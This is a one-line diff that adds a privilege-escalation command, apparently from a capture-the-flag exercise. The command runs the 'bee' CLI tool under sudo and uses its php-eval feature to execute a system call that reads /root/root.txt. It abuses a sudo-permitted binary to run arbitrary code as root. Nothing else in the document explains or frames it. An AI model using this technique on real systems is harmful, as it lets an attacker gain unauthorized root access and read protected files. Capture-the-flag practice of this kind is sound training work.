@@ -1,0 +1,1 @@
+sudo bee --root=/var/www/html php-eval 'system("cat /root/root.txt")'
